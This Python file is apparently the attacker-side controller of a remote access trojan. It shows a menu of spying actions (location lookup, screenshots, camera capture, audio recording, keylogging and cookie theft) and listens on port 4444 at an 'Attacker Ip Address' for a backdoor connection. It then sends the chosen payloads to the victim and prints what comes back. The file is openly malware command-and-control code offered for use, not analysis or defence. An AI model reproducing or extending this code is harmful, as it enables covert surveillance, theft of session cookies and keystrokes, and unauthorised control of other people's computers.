import os

import view
from afterListen import find_loc, auido, cookie_steal, keylogger, photo, screenshoot
import socket
from colorama import Fore

def listen_other_server():
    print(
        "[01] Find Location\n"
        "[02] Screenshot\n"
        "[03] Take Photo OR Record Video\n"
        "[04] Record Audio\n"
        "[05] Keylogger\n"
        "[06] Steal Cookie\n"
        "[07] Exit\n"
        "[99] Back to menu\n"
    )   
    door_choose = int(input("=> "))
    if door_choose == 7:
        exit()

    elif door_choose == 99:
        view.view()


    try: #Listen backdoor
        host = input(f"=>{Fore.RED} Attacker Ip Address: ")
        port = 4444

        serv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serv_sock.bind((host, port))
        serv_sock.listen(1)

        print(f"Waiting for connection on port {port}...")
        cnn, addr = serv_sock.accept()
        print(f"Connected to {addr}")

        while True:
            command = input(f"{host} => ")
            if command.lower() == "exit":
                cnn.send(b"exit")
                cnn.close()
                break

            if door_choose == 1:
                zx = find_loc.loc_ff()
                cnn.send(zx.encode()) 
                response = cnn.recv(4096).decode()
                print(f"{response}")

            elif door_choose == 2:
                zx = screenshoot.ss()
                cnn.send(zx.encode())  
                response = cnn.recv(4096).decode()
                print(f"{response}")

            elif door_choose == 3:
                zx = photo.photo_take()
                cnn.send(zx.encode())  
                response = cnn.recv(4096).decode()
                print(f"{response}")

            elif door_choose == 4:
                zx = auido.audioFunc()
                cnn.send(zx.encode())  
                response = cnn.recv(4096).decode()
                print(f"{response}")

            elif door_choose == 5:
                zx = keylogger.keyslog()
                cnn.send(zx.encode())  
                response = cnn.recv(4096).decode()
                print(f"{response}")

            elif door_choose == 6:
                zx = cookie_steal.steal()
                cnn.send(zx.encode()) 
                response = cnn.recv(4096).decode()
                print(f"{response}")


            
    except KeyError as e:
        print("pls use the correct character ->" + str(e))
